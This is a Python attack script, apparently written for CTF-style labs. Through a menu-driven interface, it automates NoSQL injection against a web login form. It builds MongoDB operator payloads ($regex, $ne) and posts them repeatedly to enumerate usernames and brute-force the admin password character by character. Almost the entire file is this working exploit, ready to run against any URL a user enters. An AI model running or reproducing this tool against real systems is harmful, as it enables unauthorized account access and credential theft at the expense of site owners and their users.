#!/usr/bin/env python3
#author: KAYL
#github: https://github.com/kayl22

from pwn import *
import time, requests, sys, string, signal, os

def def_handler(sig, frame):
    print(f"\n[+]CLOSING THE PROGRAM...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def username_scan(all_letters, url, characters):
   users = []
   p1 = log.progress("NoSql usernames bruteforce attack")
   p1.status("initializing bruteforce...")
   p2 = log.progress("USERNAME")
   username = ""
   content_type = {'Content-Type': 'application/json'}
   for letter in all_letters:
       username += letter
       for position in range(0, 28):
           for character in characters:
               post_data = '{"username":{"$regex": "^%s%s"},"password":{"$ne":"josejulioputero"}}' % (username,character)
               content_type = {'Content-Type': 'application/json'}
               r = requests.post(url, headers=content_type, data=post_data)
               if "Logged in as user" in r.text:
                   username += character
                   p2.status(username)
                   break
       users.append(username)
       username = ""
   return users

def nosql_userscan(url, characters):
    all_letters = ""
    print(f"\n[+]getting each user first letter...")
    for character in characters:
        post_data = '{"username":{"$regex": "^%s"},"password":{"$ne":"josejulioputero"}}' % character
        content_type = {'Content-Type': 'application/json'}     
        r = requests.post(url, headers=content_type, data=post_data)
        if "Logged in as user" in r.text:
            all_letters += character
    print(f"\n[+]FIRST LETTERS FOUND: {all_letters}")
    users = username_scan(all_letters, url, characters)
    return users

def nosql_request(username, url, characters):
    p1 = log.progress("NOsql bruteforce attack")
    p1.status("initialiting bruteforce...")
    time.sleep(2)
    p2 = log.progress("PASSWORD")
    password = ""
    content_type = {'Content-Type': 'application/json'}     
    for position in range(0, 28):
        for character in characters:
            post_data = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (username,password,character)  
            r = requests.post(url, headers=content_type, data=post_data)
            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break       
    return password


url = input("\n[*]TYPE THE URL WITH ALL THE ROUTES(ex. https://willyrex/route/1/login): ")
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
username = "admin"
if __name__ == '__main__':
    while True:
        os.system("clear")
        print(f"\n[***]æ)NoSqli(æ[***]\nauthor: kayl\n\n<==[PARAMETERS]==>\nurl = {url}\nusername = {username}\n\n<==[OPTIONS]==>\n1: change parameters(url, username)\n2: start password scanning for user [{username}]\n3: start users scan\n4: exit\n")
        num = input("\n[*]choose an option(1,2,3 or 4): ")
    
        if num == "1":
            os.system("clear")
            url = input("\n[*]TYPE THE URL WITH ALL THE ROUTES(ex. https://willyrex/route/1/login): ")
            username = input(f"\n[*]ENTER A NEW USERNAME(ex. admin): ")

        elif num == "2":
            time.sleep(0.5)
            os.system("clear")
            passwd = nosql_request(username, url, characters)
            print(f"\n\n[***]THE PASSWORD FOR USER {username} IS {passwd}")
            while True:
                response = input("\n[*]CHOOSE WHAT TO DO NEXT(1: CONTINUE, 2: EXIT): ")
                if response == "1":
                    os.system("clear")
                    break
                if response == "2":
                    os.system("clear")
                    sys.exit(0)                 

        elif num == "3":
            time.sleep(0.5)
            os.system("clear")
            users = nosql_userscan(url, characters)    
            print(f"\n\nLIST OF USERS={users}")
            while True:
                response = input("\n[*]CHOOSE WHAT TO DO NEXT(1: CONTINUE, 2: EXIT): ")
                if response == "1":
                    os.system("clear")
                    break
                if response == "2":
                    os.system("clear")
                    sys.exit(0)
                 
        elif num == "4":
            def_handler(1, 2)
            
        else:
            os.system("clear")
            pass
